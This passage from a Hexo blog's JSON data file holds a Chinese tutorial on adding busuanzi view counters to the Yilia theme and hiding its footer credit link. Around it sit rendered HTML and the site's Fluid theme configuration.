class=\"hljs-string\">\"subtitle\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(theme.fun_features.typing.enable == <span class=\"hljs-literal\">false</span>) &#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%-</span></span></span><span class=\"ruby\"> hitokoto </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(is_post() &amp;&amp; page.meta !== <span class=\"hljs-literal\">false</span>) &#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%-</span></span></span><span class=\"ruby\"> partial(<span class=\"hljs-string\">'_partial/post-meta'</span>) </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span></code></pre></p>\n<p>成品如下，还有在博客下方评论框实现的。<del>为什么刷不到那句话。</del><br><img src=\"/img/2020-09-21/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"></p>"},{"title":"使用yilia主题","index_img":"/img/2018-05-10/index.png","date":"2018-05-09T16:18:13.000Z","_content":"### 让你的博客更加好看\n\n添加阅读量\n添加访问量统计\n隐藏power链接\n<!--more-->\n##### 添加阅读量\n在yilia主题下layout/\\_partial下的的`article.ejs`\n添加以下代码\n```\n<% if ( !index ){ %>\n\t\t<span class=\"archive-article-date\">\n\t\t\t阅读量 <span id=\"busuanzi_value_page_pv\"></span>\n\t\t</span>\n<% } %>\n```\n算法a：pv的方式，单个用户连续点击n篇文章，记录n次访问量。\n算法b：uv的方式，单个用户连续点击n篇文章，只记录1次访客数。\n位置：`</header>`后面，部分代码如下\n```\n<article id=\"<%= post.layout %>-<%= post.slug %>\" class=\"article article-type-<%= post.layout %> <%if(index){%> article-index<%}%>\" itemscope itemprop=\"blogPost\">\n  <div class=\"article-inner\">\n    <% if (post.link || post.title){ %>\n      <header class=\"article-header\">\n        <%- partial('post/title', {class_name: 'article-title'}) %>\n        <% if (!post.noDate){ %>\n        <%- partial('post/date', {class_name: 'archive-article-date', date_format: null}) %>\n        <% } %>\n      </header>\n\t<% if ( !index ){ %>\n\t\t<span class=\"archive-article-date\">\n\t\t\t阅读量 <span id=\"busuanzi_value_page_pv\"></span>\n\t\t</span>\n\t<% } %>\n    <% } %>\n```    \n\n##### 添加访问量统计\n打开同一目录下的`footer.ejs`文件，添加以下代码\n```\n<script async src=\"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js\"></script>\n<span id=\"busuanzi_container_site_uv\"> \n  本站访客数<span id=\"busuanzi_value_site_uv\"></span>人次\n</span>\n```\n位置：`</footer>`上面，代码如下\n\n```<footer id=\"footer\">\n  <div class=\"outer\">\n    <div id=\"footer-info\">\n    \t<div class=\"footer-left\">\n    \t\t&copy; <%= date(new Date(), 'YYYY') %> <%= config.author || config.title %>\n    \t</div>\n      \t<div class=\"footer-right\">\n      \t\t<a href=\"http://hexo.io/\" target=\"_blank\">Hexo</a>  Theme <a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\">Yilia</a> by Litten\n      \t</div>\n    </div>\n  </div>\n<script async src=\"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js\"></script>\n<span id=\"busuanzi_container_site_uv\"> \n  本站访客数<span id=\"busuanzi_value_site_uv\"></span>人次\n</span>\n</footer>\n```\n\n##### 隐藏power链接\n也是`footer.ejs`文件\n```\n<div class=\"footer-right\">\n      \t<a href=\"http://hexo.io/\" target=\"_blank\">Hexo</a>  Theme <a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\">Yilia</a> by Litten\n</div>\n```\n对这段代码添加注释符`<!-- -->`\n```\n<!--<div class=\"footer-right\">\n      \t<a href=\"http://hexo.io/\" target=\"_blank\">Hexo</a>  Theme <a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\">Yilia</a> by Litten\n</div>-->\n```\n##### 或者\n你也可以写自己喜欢的文字上去，比如\n```\n<div>\n\t做自己想做的事~\n</div>\n```\n效果如下\n![](/img/2018-05-07/1.png)\n暂时做到这里，以后如果有看到喜欢的或者有好的想法都会补充\n","source":"_posts/2018-05-10-meihua.md","raw":"---\ntitle: 使用yilia主题\nindex_img: /img/2018-05-10/index.png\ndate: 2018-05-10 00:18:13\ntags: \n- 美化\n- yilia\n---\n### 让你的博客更加好看\n\n添加阅读量\n添加访问量统计\n隐藏power链接\n<!--more-->\n##### 添加阅读量\n在yilia主题下layout/\\_partial下的的`article.ejs`\n添加以下代码\n```\n<% if ( !index ){ %>\n\t\t<span class=\"archive-article-date\">\n\t\t\t阅读量 <span id=\"busuanzi_value_page_pv\"></span>\n\t\t</span>\n<% } %>\n```\n算法a：pv的方式，单个用户连续点击n篇文章，记录n次访问量。\n算法b：uv的方式，单个用户连续点击n篇文章，只记录1次访客数。\n位置：`</header>`后面，部分代码如下\n```\n<article id=\"<%= post.layout %>-<%= post.slug %>\" class=\"article article-type-<%= post.layout %> <%if(index){%> article-index<%}%>\" itemscope itemprop=\"blogPost\">\n  <div class=\"article-inner\">\n    <% if (post.link || post.title){ %>\n      <header class=\"article-header\">\n        <%- partial('post/title', {class_name: 'article-title'}) %>\n        <% if (!post.noDate){ %>\n        <%- partial('post/date', {class_name: 'archive-article-date', date_format: null}) %>\n        <% } %>\n      </header>\n\t<% if ( !index ){ %>\n\t\t<span class=\"archive-article-date\">\n\t\t\t阅读量 <span id=\"busuanzi_value_page_pv\"></span>\n\t\t</span>\n\t<% } %>\n    <% } %>\n```    \n\n##### 添加访问量统计\n打开同一目录下的`footer.ejs`文件，添加以下代码\n```\n<script async src=\"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js\"></script>\n<span id=\"busuanzi_container_site_uv\"> \n  本站访客数<span id=\"busuanzi_value_site_uv\"></span>人次\n</span>\n```\n位置：`</footer>`上面，代码如下\n\n```<footer id=\"footer\">\n  <div class=\"outer\">\n    <div id=\"footer-info\">\n    \t<div class=\"footer-left\">\n    \t\t&copy; <%= date(new Date(), 'YYYY') %> <%= config.author || config.title %>\n    \t</div>\n      \t<div class=\"footer-right\">\n      \t\t<a href=\"http://hexo.io/\" target=\"_blank\">Hexo</a>  Theme <a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\">Yilia</a> by Litten\n      \t</div>\n    </div>\n  </div>\n<script async src=\"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js\"></script>\n<span id=\"busuanzi_container_site_uv\"> \n  本站访客数<span id=\"busuanzi_value_site_uv\"></span>人次\n</span>\n</footer>\n```\n\n##### 隐藏power链接\n也是`footer.ejs`文件\n```\n<div class=\"footer-right\">\n      \t<a href=\"http://hexo.io/\" target=\"_blank\">Hexo</a>  Theme <a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\">Yilia</a> by Litten\n</div>\n```\n对这段代码添加注释符`<!-- -->`\n```\n<!--<div class=\"footer-right\">\n      \t<a href=\"http://hexo.io/\" target=\"_blank\">Hexo</a>  Theme <a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\">Yilia</a> by Litten\n</div>-->\n```\n##### 或者\n你也可以写自己喜欢的文字上去，比如\n```\n<div>\n\t做自己想做的事~\n</div>\n```\n效果如下\n![](/img/2018-05-07/1.png)\n暂时做到这里，以后如果有看到喜欢的或者有好的想法都会补充\n","slug":"meihua","published":1,"mouth":"05","updated":"2020-09-23T11:40:25.109Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxz000zez8kp34ekjuc","content":"<h3 id=\"让你的博客更加好看\"><a href=\"#让你的博客更加好看\" class=\"headerlink\" title=\"让你的博客更加好看\"></a>让你的博客更加好看</h3><p>添加阅读量<br>添加访问量统计<br>隐藏power链接<br><a id=\"more\"></a></p>\n<h5 id=\"添加阅读量\"><a href=\"#添加阅读量\" class=\"headerlink\" title=\"添加阅读量\"></a>添加阅读量</h5><p>在yilia主题下layout/_partial下的的<code>article.ejs</code><br>添加以下代码<br><pre><code class=\"hljs undefined\"><span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> <span class=\"hljs-keyword\">if</span> ( !<span class=\"hljs-keyword\">index</span> )&#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n\t\t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"archive-article-date\"</span>&gt;</span>\n\t\t\t阅读量 <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"busuanzi_value_page_pv\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n\t\t<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span></span></code></pre></p>\n<p>算法a：pv的方式，单个用户连续点击n篇文章，记录n次访问量。<br>算法b：uv的方式，单个用户连续点击n篇文章，只记录1次访客数。<br>位置：<code>&lt;/header&gt;</code>后面，部分代码如下<br><pre><code class=\"hljs undefined\"><span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">article</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"&lt;%=</span></span></span><span class=\"perl\"> post.layout </span><span class=\"xml\"><span class=\"hljs-tag\"><span class=\"hljs-string\">%&gt;-&lt;%=</span></span></span><span class=\"perl\"> post.slug </span><span class=\"xml\"><span class=\"hljs-tag\"><span class=\"hljs-string\">%&gt;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"article article-type-&lt;%=</span></span></span><span class=\"perl\"> post.layout </span><span class=\"xml\"><span class=\"hljs-tag\"><span class=\"hljs-string\">%&gt; &lt;%</span></span></span><span class=\"perl\"><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">index</span>)&#123;</span><span class=\"xml\"><span class=\"hljs-tag\"><span class=\"hljs-string\">%&gt; article-index&lt;%</span></span></span><span class=\"perl\">&#125;</span><span class=\"xml\"><span class=\"hljs-tag\"><span class=\"hljs-string\">%&gt;\"</span> <span class=\"hljs-attr\">itemscope</span> <span class=\"hljs-attr\">itemprop</span>=<span class=\"hljs-string\">\"blogPost\"</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"article-inner\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> <span class=\"hljs-keyword\">if</span> (post.link || post.title)&#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">header</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"article-header\"</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\">- partial(<span class=\"hljs-string\">'post/title'</span>, &#123;class_name: <span class=\"hljs-string\">'article-title'</span>&#125;) </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> <span class=\"hljs-keyword\">if</span> (!post.noDate)&#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\">- partial(<span class=\"hljs-string\">'post/date'</span>, &#123;class_name: <span class=\"hljs-string\">'archive-article-date'</span>, date_format: null&#125;) </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">header</span>&gt;</span>\n\t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> <span class=\"hljs-keyword\">if</span> ( !<span class=\"hljs-keyword\">index</span> )&#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n\t\t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"archive-article-date\"</span>&gt;</span>\n\t\t\t阅读量 <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"busuanzi_value_page_pv\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n\t\t<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n\t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n```    \n\n##### 添加访问量统计\n打开同一目录下的`footer.ejs`文件，添加以下代码</span></code></pre></p>\n<p><script async src=\"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js\"></script><br><span id=\"busuanzi_container_site_uv\"><br>  本站访客数<span id=\"busuanzi_value_site_uv\"></span>人次<br></span><br><pre><code class=\"hljs undefined\"><span class=\"xml\">位置：`<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">footer</span>&gt;</span>`上面，代码如下\n\n```<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">footer</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"footer\"</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"outer\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"footer-info\"</span>&gt;</span>\n    \t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"footer-left\"</span>&gt;</span>\n    \t\t&amp;copy; <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%=</span></span></span><span class=\"ruby\"> date(new Date(), <span class=\"hljs-string\">'YYYY'</span>) </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%=</span></span></span><span class=\"ruby\"> config.author <span class=\"hljs-params\">||</span> config.title </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n    \t<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n      \t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"footer-right\"</span>&gt;</span>\n      \t\t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"http://hexo.io/\"</span> <span class=\"hljs-attr\">target</span>=<span class=\"hljs-string\">\"_blank\"</span>&gt;</span>Hexo<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span>  Theme <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"https://github.com/litten/hexo-theme-yilia\"</span> <span class=\"hljs-attr\">target</span>=<span class=\"hljs-string\">\"_blank\"</span>&gt;</span>Yilia<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span> by Litten\n      \t<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"busuanzi_container_site_uv\"</span>&gt;</span> \n  本站访客数<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"busuanzi_value_site_uv\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>人次\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">footer</span>&gt;</span></span></code></pre></p>\n<h5 id=\"隐藏power链接\"><a href=\"#隐藏power链接\" class=\"headerlink\" title=\"隐藏power链接\"></a>隐藏power链接</h5><p>也是<code>footer.ejs</code>文件<br><pre><code class=\"hljs undefined\">&lt;<span class=\"hljs-keyword\">div</span> class=<span class=\"hljs-string\">\"footer-right\"</span>&gt;\n      \t&lt;<span class=\"hljs-keyword\">a</span> href=<span class=\"hljs-string\">\"http://hexo.io/\"</span> target=<span class=\"hljs-string\">\"_blank\"</span>&gt;Hexo&lt;/<span class=\"hljs-keyword\">a</span>&gt;  Theme &lt;<span class=\"hljs-keyword\">a</span> href=<span class=\"hljs-string\">\"https://github.com/litten/hexo-theme-yilia\"</span> target=<span class=\"hljs-string\">\"_blank\"</span>&gt;Yilia&lt;/<span class=\"hljs-keyword\">a</span>&gt; <span class=\"hljs-keyword\">by</span> Litten\n&lt;/<span class=\"hljs-keyword\">div</span>&gt;</code></pre></p>\n<p>对这段代码添加注释符<code>&lt;!-- --&gt;</code><br><pre><code class=\"hljs undefined\"><span class=\"hljs-comment\">&lt;!--&lt;div class=\"footer-right\"&gt;\n      \t&lt;a href=\"http://hexo.io/\" target=\"_blank\"&gt;Hexo&lt;/a&gt;  Theme &lt;a href=\"https://github.com/litten/hexo-theme-yilia\" target=\"_blank\"&gt;Yilia&lt;/a&gt; by Litten\n&lt;/div&gt;--&gt;</span></code></pre></p>\n<h5 id=\"或者\"><a href=\"#或者\" class=\"headerlink\" title=\"或者\"></a>或者</h5><p>你也可以写自己喜欢的文字上去，比如<br><pre><code class=\"hljs undefined\">&lt;<span class=\"hljs-keyword\">div</span>&gt;\n\t做自己想做的事~\n&lt;/<span class=\"hljs-keyword\">div</span>&gt;</code></pre></p>\n<p>效果如下<br><img src=\"/img/2018-05-07/1.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>暂时做到这里，以后如果有看到喜欢的或者有好的想法都会补充</p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<h3 id=\"让你的博客更加好看\"><a href=\"#让你的博客更加好看\" class=\"headerlink\" title=\"让你的博客更加好看\"></a>让你的博客更加好看</h3><p>添加阅读量<br>添加访问量统计<br>隐藏power链接<br>","more":"</p>\n<h5 id=\"添加阅读量\"><a href=\"#添加阅读量\" class=\"headerlink\" title=\"添加阅读量\"></a>添加阅读量</h5><p>在yilia主题下layout/_partial下的的<code>article.ejs</code><br>添加以下代码<br><pre><code class=\"hljs undefined\"><span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> <span class=\"hljs-keyword\">if</span> ( !<span class=\"hljs-keyword\">index</span> )&#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n\t\t<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"archive-article-date\"</span>&gt;</span>\n\t\t\t阅读量 <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"busuanzi_value_page_pv\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n\t\t<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"perl\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span></span></code></pre></p>\n<p>算法a：pv的方式，单个用户连续点击n篇文章，记录n次访问量。<br>算法b：uv的方式，单个用户连续点击n篇文章，只记录1次访客数。<br>位置：<code>&lt;/header&gt;</code>后面，部分代码如下<br><pre><code class=\"hljs undefined\"><span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">article</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"&lt;%=</span></span></span><span class=\"perl\"> post.layout </span><span class=\"xml\"><span class=\"hljs-tag\"><span class=\"hljs-string\">%&gt;-&lt;%=</span></span></span><span class=\"perl\"> post.slug </span><span class=\"xml\"><span class=\"hljs-tag\"><span class=\"hljs-string\">%&gt;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"article article-type-&lt;%=</span></span></span><span class=\"perl\"> post.layout 